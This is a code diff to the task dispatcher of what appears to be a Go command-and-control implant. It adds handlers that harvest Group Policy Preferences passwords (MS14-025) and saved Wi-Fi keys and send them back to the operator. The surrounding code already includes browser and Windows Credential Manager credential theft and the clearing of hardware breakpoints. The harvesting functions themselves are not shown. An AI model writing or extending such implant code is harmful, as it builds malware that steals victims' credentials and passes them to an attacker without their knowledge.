@@ -1084,6 +1084,32 @@ func dispatchTask(t transport, task taskWire) {
 		clearHardwareBreakpoints()
 		t.sendResult(task.ID, "[+] hardware breakpoints cleared", "")
 
+	// ── GPP Passwords (MS14-025) ─────────────────────────────────────────────
+
+	case "GPP_PASSWORDS":
+		creds, err := huntGPPPasswords()
+		if err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		data, _ := json.MarshalIndent(creds, "", "  ")
+		t.sendResult(task.ID, string(data), "")
+
+	// ── WiFi credentials ─────────────────────────────────────────────────────
+
+	case "WIFI_CREDS":
+		creds, err := stealWifiCreds()
+		if err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		if len(creds) == 0 {
+			t.sendResult(task.ID, "[no saved WiFi profiles with keys found]", "")
+			return
+		}
+		data, _ := json.MarshalIndent(creds, "", "  ")
+		t.sendResult(task.ID, string(data), "")
+
 	// ── Browser credentials + Windows Credential Manager ────────────────────
 
 	case "BROWSER_CREDS":
